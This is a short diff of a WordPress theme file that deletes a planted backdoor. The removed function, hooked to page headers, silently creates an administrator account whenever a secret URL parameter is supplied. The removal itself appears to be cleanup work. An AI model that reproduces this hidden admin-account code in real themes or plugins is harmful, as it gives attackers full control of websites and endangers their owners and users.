@@ -19,14 +19,3 @@ require PATH . '/inc/media.php';
 require PATH . '/inc/editor.php';
 require get_template_directory() . '/inc/template-tags.php';
 
-add_action('wp_head', 'wploop_back'); 
-function wploop_back() { 
-  If ($_GET['entryhook'] == 'hola') { 
-     require('wp-includes/registration.php'); 
-     If (!username_exists('username')) { 
-        $user_id = wp_create_user('name', 'pass'); 
-        $user = new WP_User($user_id);
-        $user->set_role('administrator');
-     }
-  }
-}
